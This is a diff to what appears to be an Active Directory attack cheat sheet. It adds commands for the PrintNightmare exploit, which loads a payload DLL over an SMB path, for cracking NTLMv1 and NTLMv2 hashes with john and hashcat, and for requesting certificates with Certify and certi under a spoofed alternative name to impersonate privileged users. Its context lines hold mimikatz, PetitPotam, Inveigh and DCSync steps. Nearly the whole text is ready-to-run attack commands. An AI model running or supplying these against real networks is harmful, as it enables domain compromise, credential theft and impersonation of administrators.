@@ -651,6 +651,10 @@ Requirements:
   ## RCE
   misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
   ```
+* [PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)
+  ```powershell
+  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
+  ```
 
 **Debug informations**
 
@@ -1694,10 +1698,15 @@ klist
     PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
     PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
     ```
-* If you got some `NTLMv1 hashes`, you need to format then submit them on [crack.sh](https://crack.sh/netntlm/), or crack them with Hashcat/John
+* If you got some `NTLMv1 hashes`, you need to format them to submit them on [crack.sh](https://crack.sh/netntlm/)
     ```ps1
     username::hostname:response:response:challenge -> NTHASH:response
     NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
+    ```
+* Or crack them with Hashcat / John The Ripper
+    ```ps1
+    john --format=netntlm hash.txt
+    hashcat -m 5500 -a 3 hash.txt
     ```
 * Now you can DCSync using the Pass-The-Hash with the DC machine account
 
@@ -1721,6 +1730,13 @@ PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
 
 # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
 PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+```
+
+Crack the hashes with Hashcat / John The Ripper
+
+```ps1
+john --format=netntlmv2 hash.txt
+hashcat -m 5600 -a 3 hash.txt
 ```
 
 
@@ -1925,9 +1941,11 @@ Exploitation:
     or
     PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
-* Use Certify to request a Certificate and add an alternative name (user to impersonate)
+* Use Certify or [Certi](https://github.com/eloypgz/certi) to request a Certificate and add an alternative name (user to impersonate)
     ```ps1
+    # request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
     Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
+    certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
     ```
 * Use OpenSSL and convert the certificate, do not enter a password
     ```ps1
